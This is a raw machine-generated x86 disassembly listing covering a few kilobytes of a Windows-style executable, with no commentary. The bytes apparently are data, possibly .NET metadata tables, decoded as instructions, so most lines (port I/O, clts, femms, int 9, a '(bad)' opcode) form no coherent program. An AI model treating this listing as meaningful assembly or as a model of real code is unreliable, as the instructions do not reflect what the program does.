  4047ea:	5e                   	pop    %esi
  4047eb:	0c 06                	or     $0x6,%al
  4047ed:	00 66 01             	add    %ah,0x1(%esi)
  4047f0:	bd 10 06 00 96       	mov    $0x96000610,%ebp
  4047f5:	0c ee                	or     $0xee,%al
  4047f7:	0b 0a                	or     (%edx),%ecx
  4047f9:	00 2b                	add    %ch,(%ebx)
  4047fb:	11 b1 12 0a 00 fb    	adc    %esi,-0x4fff5ee(%ecx)
  404801:	06                   	push   %es
  404802:	b1 12                	mov    $0x12,%cl
  404804:	0a 00                	or     (%eax),%al
  404806:	b0 11                	mov    $0x11,%al
  404808:	b1 12                	mov    $0x12,%cl
  40480a:	0a 00                	or     (%eax),%al
  40480c:	1c 12                	sbb    $0x12,%al
  40480e:	b1 12                	mov    $0x12,%cl
  404810:	06                   	push   %es
  404811:	00 f5                	add    %dh,%ch
  404813:	0b cd                	or     %ebp,%ecx
  404815:	09 06                	or     %eax,(%esi)
  404817:	00 0b                	add    %cl,(%ebx)
  404819:	07                   	pop    %es
  40481a:	ee                   	out    %al,(%dx)
  40481b:	0b 06                	or     (%esi),%eax
  40481d:	00 be 06 e6 0f 06    	add    %bh,0x60fe606(%esi)
  404823:	00 86 01 e6 0f 06    	add    %al,0x60fe601(%esi)
  404829:	00 62 0e             	add    %ah,0xe(%edx)
  40482c:	e6 0f                	out    %al,$0xf
  40482e:	06                   	push   %es
  40482f:	00 03                	add    %al,(%ebx)
  404831:	0d ee 0b 06 00       	or     $0x60bee,%eax
  404836:	e1 0c                	loope  0x404844
  404838:	f8                   	clc
  404839:	02 06                	add    (%esi),%al
  40483b:	00 cf                	add    %cl,%bh
  40483d:	0d e6 0f 06 00       	or     $0x60fe6,%eax
  404842:	5b                   	pop    %ebx
  404843:	08 5f 0f             	or     %bl,0xf(%edi)
  404846:	06                   	push   %es
  404847:	00 6d 01             	add    %ch,0x1(%ebp)
  40484a:	e6 0f                	out    %al,$0xf
  40484c:	06                   	push   %es
  40484d:	00 94 01 1c 03 06 00 	add    %dl,0x6031c(%ecx,%eax,1)
  404854:	e6 12                	out    %al,$0x12
  404856:	cd 09                	int    $0x9
  404858:	06                   	push   %es
  404859:	00 77 07             	add    %dh,0x7(%edi)
  40485c:	ee                   	out    %al,(%dx)
  40485d:	0b 06                	or     (%esi),%eax
  40485f:	00 41 0d             	add    %al,0xd(%ecx)
  404862:	f8                   	clc
  404863:	02 06                	add    (%esi),%al
  404865:	00 36                	add    %dh,(%esi)
  404867:	05 cd 09 06 00       	add    $0x609cd,%eax
  40486c:	51                   	push   %ecx
  40486d:	01 ee                	add    %ebp,%esi
  40486f:	0b 06                	or     (%esi),%eax
  404871:	00 9a 06 ee 0b 06    	add    %bl,0x60bee06(%edx)
  404877:	00 ed                	add    %ch,%ch
  404879:	0c bd                	or     $0xbd,%al
  40487b:	10 06                	adc    %al,(%esi)
  40487d:	00 34 0c             	add    %dh,(%esp,%ecx,1)
  404880:	cd 09                	int    $0x9
  404882:	06                   	push   %es
  404883:	00 4a 0d             	add    %cl,0xd(%edx)
  404886:	f8                   	clc
  404887:	02 06                	add    (%esi),%al
  404889:	00 01                	add    %al,(%ecx)
  40488b:	0e                   	push   %cs
  40488c:	5f                   	pop    %edi
  40488d:	0f 06                	clts
  40488f:	00 4d 0a             	add    %cl,0xa(%ebp)
  404892:	ee                   	out    %al,(%dx)
  404893:	0b 06                	or     (%esi),%eax
  404895:	00 8c 05 ee 0b 06 00 	add    %cl,0x60bee(%ebp,%eax,1)
  40489c:	09 02                	or     %eax,(%edx)
  40489e:	ee                   	out    %al,(%dx)
  40489f:	0b 12                	or     (%edx),%edx
  4048a1:	00 81 05 a6 0d 06    	add    %al,0x60da605(%ecx)
  4048a7:	00 58 01             	add    %bl,0x1(%eax)
  4048aa:	1c 03                	sbb    $0x3,%al
  4048ac:	06                   	push   %es
  4048ad:	00 6a 14             	add    %ch,0x14(%edx)
  4048b0:	bc 01 06 00 cd       	mov    $0xcd000601,%esp
  4048b5:	01 ee                	add    %ebp,%esi
  4048b7:	0b 0e                	or     (%esi),%ecx
  4048b9:	00 5e 0a             	add    %bl,0xa(%esi)
  4048bc:	5f                   	pop    %edi
  4048bd:	0f 06                	clts
  4048bf:	00 f2                	add    %dh,%dl
  4048c1:	03 cd                	add    %ebp,%ecx
  4048c3:	09 0e                	or     %ecx,(%esi)
  4048c5:	00 d4                	add    %dl,%ah
  4048c7:	05 5f 0f 06 00       	add    $0x60f5f,%eax
  4048cc:	0d 0b f8 02 06       	or     $0x602f80b,%eax
  4048d1:	00 41 14             	add    %al,0x14(%ecx)
  4048d4:	f8                   	clc
  4048d5:	02 06                	add    (%esi),%al
  4048d7:	00 c3                	add    %al,%bl
  4048d9:	12 ee                	adc    %dh,%ch
  4048db:	0b 3f                	or     (%edi),%edi
  4048dd:	01 f3                	add    %esi,%ebx
  4048df:	0d 00 00 06 00       	or     $0x60000,%eax
  4048e4:	9c                   	pushf
  4048e5:	05 f8 02 06 00       	add    $0x602f8,%eax
  4048ea:	bd 05 ee 0b 06       	mov    $0x60bee05,%ebp
  4048ef:	00 fb                	add    %bh,%bl
  4048f1:	09 8d 13 06 00 cd    	or     %ecx,-0x32fff9ed(%ebp)
  4048f7:	0b f8                	or     %eax,%edi
  4048f9:	02 06                	add    (%esi),%al
  4048fb:	00 c4                	add    %al,%ah
  4048fd:	0d f8 02 06 00       	or     $0x602f8,%eax
  404902:	86 0e                	xchg   %cl,(%esi)
  404904:	f8                   	clc
  404905:	02 0e                	add    (%esi),%cl
  404907:	00 79 0d             	add    %bh,0xd(%ecx)
  40490a:	5f                   	pop    %edi
  40490b:	0f 0e                	femms
  40490d:	00 ee                	add    %ch,%dh
  40490f:	10 4e 12             	adc    %cl,0x12(%esi)
  404912:	0e                   	push   %cs
  404913:	00 4b 14             	add    %cl,0x14(%ebx)
  404916:	4e                   	dec    %esi
  404917:	12 0e                	adc    (%esi),%cl
  404919:	00 0e                	add    %cl,(%esi)
  40491b:	14 e0                	adc    $0xe0,%al
  40491d:	11 06                	adc    %eax,(%esi)
  40491f:	00 b2 0d ee 0b 0e    	add    %dh,0xe0bee0d(%edx)
  404925:	00 fa                	add    %bh,%dl
  404927:	11 5e 0c             	adc    %ebx,0xc(%esi)
  40492a:	06                   	push   %es
  40492b:	00 80 10 f8 02 0e    	add    %al,0xe02f810(%eax)
  404931:	00 f2                	add    %dh,%dl
  404933:	05 5f 0f 06 00       	add    $0x60f5f,%eax
  404938:	2c 0d                	sub    $0xd,%al
  40493a:	ee                   	out    %al,(%dx)
  40493b:	0b 06                	or     (%esi),%eax
  40493d:	00 83 14 50 0b 06    	add    %al,0x60b5014(%ebx)
  404943:	00 6a 0b             	add    %ch,0xb(%edx)
  404946:	50                   	push   %eax
  404947:	0b 06                	or     (%esi),%eax
  404949:	00 aa 05 50 0b 06    	add    %ch,0x60b5005(%edx)
  40494f:	00 be 0e ee 0b 06    	add    %bh,0x60bee0e(%esi)
  404955:	00 57 0f             	add    %dl,0xf(%edi)
  404958:	cd 09                	int    $0x9
  40495a:	06                   	push   %es
  40495b:	00 19                	add    %bl,(%ecx)
  40495d:	07                   	pop    %es
  40495e:	f8                   	clc
  40495f:	02 06                	add    (%esi),%al
  404961:	00 8a 0d f8 02 06    	add    %cl,0x602f80d(%edx)
  404967:	00 6a 0d             	add    %ch,0xd(%edx)
  40496a:	f8                   	clc
  40496b:	02 0a                	add    (%edx),%cl
  40496d:	00 a1 0b b1 12 0a    	add    %ah,0xa12b10b(%ecx)
  404973:	00 8d 0b b1 12 06    	add    %cl,0x612b10b(%ebp)
  404979:	00 21                	add    %ah,(%ecx)
  40497b:	0c ee                	or     $0xee,%al
  40497d:	0b 0a                	or     (%edx),%ecx
  40497f:	00 4e 11             	add    %cl,0x11(%esi)
  404982:	b1 12                	mov    $0x12,%cl
  404984:	0a 00                	or     (%eax),%al
  404986:	f7 0a b1 12 0a 00    	testl  $0xa12b1,(%edx)
  40498c:	3d 11 b1 12 0a       	cmp    $0xa12b111,%eax
  404991:	00 31                	add    %dh,(%ecx)
  404993:	12 b1 12 0a 00 17    	adc    0x17000a12(%ecx),%dh
  404999:	11 b1 12 0a 00 af    	adc    %esi,-0x50fff5ee(%ecx)
  40499f:	0c b1                	or     $0xb1,%al
  4049a1:	12 0a                	adc    (%edx),%cl
  4049a3:	00 02                	add    %al,(%edx)
  4049a5:	03 b1 12 06 00 cc    	add    -0x33fff9ee(%ecx),%esi
  4049ab:	01 ee                	add    %ebp,%esi
  4049ad:	0b 06                	or     (%esi),%eax
  4049af:	00 54 0d a6          	add    %dl,-0x5a(%ebp,%ecx,1)
  4049b3:	0f 00 00             	sldt   (%eax)
  4049b6:	00 00                	add    %al,(%eax)
  4049b8:	d2 02                	rolb   %cl,(%edx)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	00 00                	add    %al,(%eax)
  4049be:	01 00                	add    %eax,(%eax)
  4049c0:	01 00                	add    %eax,(%eax)
  4049c2:	80 01 10             	addb   $0x10,(%ecx)
  4049c5:	00 54 0a 0a          	add    %dl,0xa(%edx,%ecx,1)
  4049c9:	0c 4d                	or     $0x4d,%al
  4049cb:	00 01                	add    %al,(%ecx)
  4049cd:	00 01                	add    %al,(%ecx)
  4049cf:	00 80 01 10 00 02    	add    %al,0x2001001(%eax)
  4049d5:	05 0a 0c 4d 00       	add    $0x4d0c0a,%eax
  4049da:	02 00                	add    (%eax),%al
  4049dc:	08 00                	or     %al,(%eax)
  4049de:	80 01 10             	addb   $0x10,(%ecx)
  4049e1:	00 03                	add    %al,(%ebx)
  4049e3:	04 0a                	add    $0xa,%al
  4049e5:	0c 4d                	or     $0x4d,%al
  4049e7:	00 03                	add    %al,(%ebx)
  4049e9:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4049ec:	80 01 10             	addb   $0x10,(%ecx)
  4049ef:	00 2a                	add    %ch,(%edx)
  4049f1:	05 0a 0c 4d 00       	add    $0x4d0c0a,%eax
  4049f6:	07                   	pop    %es
  4049f7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4049fa:	80 01 10             	addb   $0x10,(%ecx)
  4049fd:	00 d4                	add    %dl,%ah
  4049ff:	0b 0a                	or     (%edx),%ecx
  404a01:	0c 4d                	or     $0x4d,%al
  404a03:	00 0a                	add    %cl,(%edx)
  404a05:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404a08:	80 01 10             	addb   $0x10,(%ecx)
  404a0b:	00 02                	add    %al,(%edx)
  404a0d:	0f 0a                	(bad)
  404a0f:	0c 4d                	or     $0x4d,%al
  404a11:	00 0b                	add    %cl,(%ebx)
  404a13:	00 1e                	add    %bl,(%esi)
  404a15:	00 80 01 10 00 24    	add    %al,0x24001001(%eax)
  404a1b:	0b 0a                	or     (%edx),%ecx
  404a1d:	0c 4d                	or     $0x4d,%al
  404a1f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a22:	21 00                	and    %eax,(%eax)
  404a24:	80 01 10             	addb   $0x10,(%ecx)
  404a27:	00 f1                	add    %dh,%cl
  404a29:	09 0a                	or     %ecx,(%edx)
  404a2b:	0c 4d                	or     $0x4d,%al
  404a2d:	00 0f                	add    %cl,(%edi)
  404a2f:	00 26                	add    %ah,(%esi)
  404a31:	00 80 01 10 00 f9    	add    %al,-0x6ffefff(%eax)
  404a37:	03 0a                	add    (%edx),%ecx
  404a39:	0c 4d                	or     $0x4d,%al
  404a3b:	00 13                	add    %dl,(%ebx)
  404a3d:	00 2c 00             	add    %ch,(%eax,%eax,1)
  404a40:	03 01                	add    (%ecx),%eax
  404a42:	10 00                	adc    %al,(%eax)
  404a44:	97                   	xchg   %eax,%edi
  404a45:	00 00                	add    %al,(%eax)
  404a47:	00 4d 00             	add    %cl,0x0(%ebp)
  404a4a:	13 00                	adc    (%eax),%eax
  404a4c:	2e 00 03             	add    %al,%cs:(%ebx)
  404a4f:	21 10                	and    %edx,(%eax)
  404a51:	00 18                	add    %bl,(%eax)
  404a53:	03 00                	add    (%eax),%eax
  404a55:	00 4d 00             	add    %cl,0x0(%ebp)
  404a58:	14 00                	adc    $0x0,%al
  404a5a:	30 00                	xor    %al,(%eax)
  404a5c:	03 01                	add    (%ecx),%eax
  404a5e:	10 00                	adc    %al,(%eax)
  404a60:	28 00                	sub    %al,(%eax)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	4d                   	dec    %ebp
  404a65:	00 16                	add    %dl,(%esi)
  404a67:	00 33                	add    %dh,(%ebx)
  404a69:	00 03                	add    %al,(%ebx)
  404a6b:	01 10                	add    %edx,(%eax)
  404a6d:	00 97 00 00 00 4d    	add    %dl,0x4d000000(%edi)
  404a73:	00 18                	add    %bl,(%eax)
  404a75:	00 35 00 03 01 10    	add    %dh,0x10010300
  404a7b:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  404a7e:	00 00                	add    %al,(%eax)
  404a80:	4d                   	dec    %ebp
  404a81:	00 1a                	add    %bl,(%edx)
  404a83:	00 36                	add    %dh,(%esi)
  404a85:	00 03                	add    %al,(%ebx)
  404a87:	01 10                	add    %edx,(%eax)
  404a89:	00 bc 02 00 00 bd 00 	add    %bh,0xbd0000(%edx,%eax,1)
  404a90:	1c 00                	sbb    $0x0,%al
  404a92:	38 00                	cmp    %al,(%eax)
  404a94:	03 01                	add    (%ecx),%eax
  404a96:	10 00                	adc    %al,(%eax)
  404a98:	52                   	push   %edx
  404a99:	02 00                	add    (%eax),%al
  404a9b:	00 bd 00 24 00 3a    	add    %bh,0x3a002400(%ebp)
  404aa1:	00 03                	add    %al,(%ebx)
  404aa3:	01 10                	add    %edx,(%eax)
  404aa5:	00 01                	add    %al,(%ecx)
  404aa7:	00 00                	add    %al,(%eax)
  404aa9:	00 bd 00 2c 00 3c    	add    %bh,0x3c002c00(%ebp)
  404aaf:	00 03                	add    %al,(%ebx)
  404ab1:	21 10                	and    %edx,(%eax)
  404ab3:	00 18                	add    %bl,(%eax)
  404ab5:	03 00                	add    (%eax),%eax
  404ab7:	00 4d 00             	add    %cl,0x0(%ebp)
  404aba:	31 00                	xor    %eax,(%eax)
  404abc:	3e 00 03             	add    %al,%ds:(%ebx)
  404abf:	21 10                	and    %edx,(%eax)
  404ac1:	00 18                	add    %bl,(%eax)
  404ac3:	03 00                	add    (%eax),%eax
  404ac5:	00 4d 00             	add    %cl,0x0(%ebp)
  404ac8:	33 00                	xor    (%eax),%eax
  404aca:	41                   	inc    %ecx
  404acb:	00 03                	add    %al,(%ebx)
  404acd:	01 10                	add    %edx,(%eax)
  404acf:	00 6f 02             	add    %ch,0x2(%edi)
  404ad2:	00 00                	add    %al,(%eax)
  404ad4:	bd 00 35 00 44       	mov    $0x44003500,%ebp
  404ad9:	00 03                	add    %al,(%ebx)
  404adb:	21 10                	and    %edx,(%eax)
  404add:	00 18                	add    %bl,(%eax)
  404adf:	03 00                	add    (%eax),%eax
  404ae1:	00 4d 00             	add    %cl,0x0(%ebp)
  404ae4:	3a 00                	cmp    (%eax),%al
  404ae6:	46                   	inc    %esi
  404ae7:	00 03                	add    %al,(%ebx)
  404ae9:	01 10                	add    %edx,(%eax)
  404aeb:	00 ac 00 00 00 4d 00 	add    %ch,0x4d0000(%eax,%eax,1)
  404af2:	3c 00                	cmp    $0x0,%al
  404af4:	49                   	dec    %ecx
  404af5:	00 03                	add    %al,(%ebx)
  404af7:	01 10                	add    %edx,(%eax)
  404af9:	00 99 02 00 00 bd    	add    %bl,-0x42fffffe(%ecx)
  404aff:	00 3d 00 4b 00 03    	add    %bh,0x3004b00
  404b05:	01 10                	add    %edx,(%eax)
  404b07:	00 dd                	add    %bl,%ch
  404b09:	03 00                	add    (%eax),%eax
  404b0b:	00 bd 00 43 00 4d    	add    %bh,0x4d004300(%ebp)
  404b11:	00 03                	add    %al,(%ebx)
  404b13:	01 10                	add    %edx,(%eax)
  404b15:	00 b2 03 00 00 bd    	add    %dh,-0x42fffffd(%edx)
  404b1b:	00 4d 00             	add    %cl,0x0(%ebp)
  404b1e:	4f                   	dec    %edi
  404b1f:	00 03                	add    %al,(%ebx)
  404b21:	01 10                	add    %edx,(%eax)
  404b23:	00 c3                	add    %al,%bl
  404b25:	03 00                	add    (%eax),%eax
  404b27:	00 bd 00 51 00 51    	add    %bh,0x51005100(%ebp)
  404b2d:	00 31                	add    %dh,(%ecx)
  404b2f:	00 51 10             	add    %dl,0x10(%ecx)
  404b32:	24 06                	and    $0x6,%al
  404b34:	31 00                	xor    %eax,(%eax)
  404b36:	6a 11                	push   $0x11
  404b38:	24 06                	and    $0x6,%al
  404b3a:	31 00                	xor    %eax,(%eax)
  404b3c:	e0 04                	loopne 0x404b42
  404b3e:	28 06                	sub    %al,(%esi)
  404b40:	31 00                	xor    %eax,(%eax)
  404b42:	66 10 24 06          	data16 adc %ah,(%esi,%eax,1)
  404b46:	51                   	push   %ecx
  404b47:	80 d4 10             	adc    $0x10,%ah
  404b4a:	2c 06                	sub    $0x6,%al
  404b4c:	51                   	push   %ecx
  404b4d:	80 f2 12             	xor    $0x12,%dl
  404b50:	2c 06                	sub    $0x6,%al
  404b52:	31 00                	xor    %eax,(%eax)
  404b54:	7e 11                	jle    0x404b67
  404b56:	24 06                	and    $0x6,%al
  404b58:	31 00                	xor    %eax,(%eax)
  404b5a:	6c                   	insb   (%dx),%es:(%edi)
  404b5b:	06                   	push   %es
  404b5c:	3d 02 11 00 e0       	cmp    $0xe0001102,%eax
  404b61:	04 28                	add    $0x28,%al
  404b63:	06                   	push   %es
  404b64:	11 00                	adc    %eax,(%eax)
  404b66:	e0 04                	loopne 0x404b6c
  404b68:	28 06                	sub    %al,(%esi)
  404b6a:	31 00                	xor    %eax,(%eax)
  404b6c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404b6d:	10 24 06             	adc    %ah,(%esi,%eax,1)
  404b70:	31 00                	xor    %eax,(%eax)
  404b72:	e0 04                	loopne 0x404b78
  404b74:	28 06                	sub    %al,(%esi)
  404b76:	11 00                	adc    %eax,(%eax)
  404b78:	0e                   	push   %cs
  404b79:	0a 2f                	or     (%edi),%ch
  404b7b:	06                   	push   %es
  404b7c:	11 00                	adc    %eax,(%eax)
  404b7e:	dc 11                	fcoml  (%ecx)
  404b80:	32 06                	xor    (%esi),%al
  404b82:	31 00                	xor    %eax,(%eax)
  404b84:	91                   	xchg   %eax,%ecx
  404b85:	0a 3d 02 31 00 e0    	or     0xe0003102,%bh
  404b8b:	04 28                	add    $0x28,%al
  404b8d:	06                   	push   %es
  404b8e:	31 00                	xor    %eax,(%eax)
  404b90:	8e 11                	mov    (%ecx),%ss
  404b92:	24 06                	and    $0x6,%al
  404b94:	11 00                	adc    %eax,(%eax)
  404b96:	dc 11                	fcoml  (%ecx)
  404b98:	32 06                	xor    (%esi),%al
  404b9a:	06                   	push   %es
  404b9b:	00 95 06 3d 02 36    	add    %dl,0x36023d06(%ebp)
  404ba1:	00 b8 02 37 06 16    	add    %bh,0x16063702(%eax)
  404ba7:	00 63 00             	add    %ah,0x0(%ebx)
  404baa:	3b 06                	cmp    (%esi),%eax
  404bac:	06                   	push   %es
  404bad:	00 9e 0d 3d 02 06    	add    %bl,0x6023d0d(%esi)
  404bb3:	00 9c 0a 3d 02 06 00 	add    %bl,0x6023d(%edx,%ecx,1)
  404bba:	4e                   	dec    %esi
  404bbb:	05 3d 02 06 00       	add    $0x6023d,%eax
  404bc0:	23 0e                	and    (%esi),%ecx
  404bc2:	40                   	inc    %eax
  404bc3:	06                   	push   %es
  404bc4:	06                   	push   %es
  404bc5:	00 9e 0d 3d 02 06    	add    %bl,0x6023d0d(%esi)
  404bcb:	00 ac 01 45 06 06 00 	add    %ch,0x60645(%ecx,%eax,1)
  404bd2:	54                   	push   %esp
  404bd3:	07                   	pop    %es
  404bd4:	2c 06                	sub    $0x6,%al
  404bd6:	06                   	push   %es
  404bd7:	00 e6                	add    %ah,%dh
  404bd9:	0d 49 06 06 00       	or     $0x60649,%eax
  404bde:	16                   	push   %ss
  404bdf:	13 3d 02 06 00 01    	adc    0x1000602,%edi
  404be5:	13 2c 06             	adc    (%esi,%eax,1),%ebp
  404be8:	06                   	push   %es
  404be9:	00 4e 13             	add    %cl,0x13(%esi)
  404bec:	2c 06                	sub    $0x6,%al
  404bee:	01 00                	add    %eax,(%eax)
  404bf0:	ee                   	out    %al,(%dx)
  404bf1:	01 51 06             	add    %edx,0x6(%ecx)
  404bf4:	01 00                	add    %eax,(%eax)
  404bf6:	21 02                	and    %eax,(%edx)
  404bf8:	56                   	push   %esi
  404bf9:	06                   	push   %es
  404bfa:	01 00                	add    %eax,(%eax)
  404bfc:	4a                   	dec    %edx
  404bfd:	01 5a 06             	add    %ebx,0x6(%edx)
  404c00:	06                   	push   %es
  404c01:	00 54 07 2c          	add    %dl,0x2c(%edi,%eax,1)
  404c05:	06                   	push   %es
  404c06:	06                   	push   %es
  404c07:	00 e6                	add    %ah,%dh
  404c09:	0d 63 06 01 00       	or     $0x10663,%eax
  404c0e:	31 01                	xor    %eax,(%ecx)
  404c10:	45                   	inc    %ebp
  404c11:	06                   	push   %es
  404c12:	01 00                	add    %eax,(%eax)
  404c14:	fb                   	sti
  404c15:	01 68 06             	add    %ebp,0x6(%eax)
  404c18:	01 00                	add    %eax,(%eax)
  404c1a:	e1 01                	loope  0x404c1d
  404c1c:	3d 02 01 00 33       	cmp    $0x33000102,%eax
  404c21:	02 6c 06 01          	add    0x1(%esi,%eax,1),%ch
  404c25:	00 4a 02             	add    %cl,0x2(%edx)
  404c28:	2c 06                	sub    $0x6,%al
  404c2a:	01 00                	add    %eax,(%eax)
  404c2c:	4a                   	dec    %edx
  404c2d:	01 75 06             	add    %esi,0x6(%ebp)
  404c30:	06                   	push   %es
  404c31:	00 54 07 2c          	add    %dl,0x2c(%edi,%eax,1)
  404c35:	06                   	push   %es
  404c36:	06                   	push   %es
  404c37:	00 e6                	add    %ah,%dh
  404c39:	0d 63 06 06 00       	or     $0x60663,%eax
  404c3e:	9e                   	sahf
  404c3f:	0d 3d 02 06 00       	or     $0x6023d,%eax
  404c44:	9c                   	pushf
  404c45:	0a 3d 02 01 00 4a    	or     0x4a000102,%bh
  404c4b:	01 75 06             	add    %esi,0x6(%ebp)
  404c4e:	36 00 b8 02 7a 06 16 	add    %bh,%ss:0x16067a02(%eax)
  404c55:	00 3e                	add    %bh,(%esi)
  404c57:	00 7e 06             	add    %bh,0x6(%esi)
  404c5a:	36 00 b8 02 83 06 16 	add    %bh,%ss:0x16068302(%eax)
  404c61:	00 3e                	add    %bh,(%esi)
  404c63:	00 87 06 06 00 54    	add    %al,0x54000606(%edi)
  404c69:	07                   	pop    %es
  404c6a:	2c 06                	sub    $0x6,%al
  404c6c:	06                   	push   %es
  404c6d:	00 e6                	add    %ah,%dh
  404c6f:	0d 63 06 01 00       	or     $0x10663,%eax
  404c74:	ee                   	out    %al,(%dx)
  404c75:	01 51 06             	add    %edx,0x6(%ecx)
  404c78:	01 00                	add    %eax,(%eax)
  404c7a:	21 02                	and    %eax,(%edx)
  404c7c:	56                   	push   %esi
  404c7d:	06                   	push   %es
  404c7e:	01 00                	add    %eax,(%eax)
  404c80:	4a                   	dec    %edx
  404c81:	01 5a 06             	add    %ebx,0x6(%edx)
  404c84:	36 00 b8 02 90 06 16 	add    %bh,%ss:0x16069002(%eax)
  404c8b:	00 63 00             	add    %ah,0x0(%ebx)
  404c8e:	87 06                	xchg   %eax,(%esi)
  404c90:	06                   	push   %es
  404c91:	00 98 05 3d 02 06    	add    %bl,0x6023d05(%eax)
  404c97:	00 54 07 2c          	add    %dl,0x2c(%edi,%eax,1)
  404c9b:	06                   	push   %es
  404c9c:	06                   	push   %es
  404c9d:	00 e6                	add    %ah,%dh
  404c9f:	0d 63 06 01 00       	or     $0x10663,%eax
  404ca4:	31 01                	xor    %eax,(%ecx)
  404ca6:	94                   	xchg   %eax,%esp
  404ca7:	06                   	push   %es
  404ca8:	01 00                	add    %eax,(%eax)
  404caa:	a1 01 24 06 01       	mov    0x1062401,%eax
  404caf:	00 16                	add    %dl,(%esi)
  404cb1:	02 2c 06             	add    (%esi,%eax,1),%ch
  404cb4:	01 00                	add    %eax,(%eax)
  404cb6:	4a                   	dec    %edx
  404cb7:	01 75 06             	add    %esi,0x6(%ebp)
  404cba:	06                   	push   %es
  404cbb:	00 54 07 2c          	add    %dl,0x2c(%edi,%eax,1)
  404cbf:	06                   	push   %es
  404cc0:	06                   	push   %es
  404cc1:	00 e6                	add    %ah,%dh
  404cc3:	0d 63 06 06 00       	or     $0x60663,%eax
  404cc8:	b3 10                	mov    $0x10,%bl
  404cca:	68 06 01 00 a1       	push   $0xa1000106
  404ccf:	01 98 06 01 00 16    	add    %ebx,0x16000106(%eax)
  404cd5:	02 2c 06             	add    (%esi,%eax,1),%ch
  404cd8:	01 00                	add    %eax,(%eax)
  404cda:	4a                   	dec    %edx
  404cdb:	01 9b 06 01 00 3f    	add    %ebx,0x3f000106(%ebx)
  404ce1:	02 24 06             	add    (%esi,%eax,1),%ah
  404ce4:	01 00                	add    %eax,(%eax)
  404ce6:	64 02 2c 06          	add    %fs:(%esi,%eax,1),%ch
  404cea:	01 00                	add    %eax,(%eax)
  404cec:	8d 02                	lea    (%edx),%eax
  404cee:	3d 02 01 00 02       	cmp    $0x2000102,%eax
  404cf3:	02 75 06             	add    0x6(%ebp),%dh
  404cf6:	06                   	push   %es
  404cf7:	00 54 07 2c          	add    %dl,0x2c(%edi,%eax,1)
  404cfb:	06                   	push   %es
  404cfc:	06                   	push   %es
  404cfd:	00 e6                	add    %ah,%dh
  404cff:	0d 63 06 01 00       	or     $0x10663,%eax
  404d04:	d3 01                	roll   %cl,(%ecx)
  404d06:	a3 06 01 00 4a       	mov    %eax,0x4a000106
  404d0b:	01 75 06             	add    %esi,0x6(%ebp)
  404d0e:	06                   	push   %es
  404d0f:	00 54 07 2c          	add    %dl,0x2c(%edi,%eax,1)
  404d13:	06                   	push   %es
  404d14:	06                   	push   %es
  404d15:	00 e6                	add    %ah,%dh
  404d17:	0d 63 06 01 00       	or     $0x10663,%eax
  404d1c:	4a                   	dec    %edx
  404d1d:	01 75 06             	add    %esi,0x6(%ebp)
  404d20:	50                   	push   %eax
  404d21:	20 00                	and    %al,(%eax)
  404d23:	00 00                	add    %al,(%eax)
  404d25:	00 96 00 e9 02 2d    	add    %dl,0x2d02e900(%esi)
  404d2b:	00 01                	add    %al,(%ecx)
  404d2d:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  404d33:	00 91 00 27 04 2d    	add    %dl,0x2d042700(%ecx)
  404d39:	00 01                	add    %al,(%ecx)
  404d3b:	00 90 20 00 00 00    	add    %dl,0x20(%eax)
  404d41:	00 91 00 db 02 2d    	add    %dl,0x2d02db00(%ecx)
  404d47:	00 01                	add    %al,(%ecx)
  404d49:	00 a4 21 00 00 00 00 	add    %ah,0x0(%ecx,%eiz,1)
  404d50:	91                   	xchg   %eax,%ecx
  404d51:	00 18                	add    %bl,(%eax)
  404d53:	0a 2d 00 01 00 18    	or     0x18000100,%ch
  404d59:	22 00                	and    (%eax),%al
  404d5b:	00 00                	add    %al,(%eax)
  404d5d:	00 91 00 59 12 2d    	add    %dl,0x2d125900(%ecx)
  404d63:	00 01                	add    %al,(%ecx)
  404d65:	00 84 22 00 00 00 00 	add    %al,0x0(%edx,%eiz,1)
  404d6c:	91                   	xchg   %eax,%ecx
  404d6d:	00 d3                	add    %dl,%bl
  404d6f:	13 2d 00 01 00 cc    	adc    0xcc000100,%ebp
  404d75:	22 00                	and    (%eax),%al
  404d77:	00 00                	add    %al,(%eax)
  404d79:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404d7f:	02 01                	add    (%ecx),%al
  404d81:	00 64 23 00          	add    %ah,0x0(%ebx,%eiz,1)
  404d85:	00 00                	add    %al,(%eax)
  404d87:	00 96 00 75 05 e9    	add    %dl,-0x16fa8b00(%esi)
  404d8d:	02 01                	add    (%ecx),%al
  404d8f:	00 d8                	add    %bl,%al
  404d91:	23 00                	and    (%eax),%eax
  404d93:	00 00                	add    %al,(%eax)
  404d95:	00 91 00 76 0a f7    	add    %dl,-0x8f58a00(%ecx)
  404d9b:	00 01                	add    %al,(%ecx)
  404d9d:	00 04 24             	add    %al,(%esp)
  404da0:	00 00                	add    %al,(%eax)
  404da2:	00 00                	add    %al,(%eax)
  404da4:	91                   	xchg   %eax,%ecx
  404da5:	00 2a                	add    %ch,(%edx)
  404da7:	13 0c 01             	adc    (%ecx,%eax,1),%ecx
  404daa:	01 00                	add    %eax,(%eax)
  404dac:	dc 24 00             	fsubl  (%eax,%eax,1)
  404daf:	00 00                	add    %al,(%eax)
  404db1:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404db7:	02 03                	add    (%ebx),%al
  404db9:	00 0c 25 00 00 00 00 	add    %cl,0x0(,%eiz,1)
  404dc0:	96                   	xchg   %eax,%esi
  404dc1:	00 37                	add    %dh,(%edi)
  404dc3:	03 a8 06 03 00 48    	add    0x48000306(%eax),%ebp
  404dc9:	25 00 00 00 00       	and    $0x0,%eax
  404dce:	91                   	xchg   %eax,%ecx
  404dcf:	00 2d 0e e9 02 03    	add    %ch,0x302e90e
  404dd5:	00 9c 26 00 00 00 00 	add    %bl,0x0(%esi,%eiz,1)
  404ddc:	91                   	xchg   %eax,%ecx
  404ddd:	00 c4                	add    %al,%ah
  404ddf:	04 ec                	add    $0xec,%al
  404de1:	00 03                	add    %al,(%ebx)
  404de3:	00 4c 27 00          	add    %cl,0x0(%edi,%eiz,1)
  404de7:	00 00                	add    %al,(%eax)
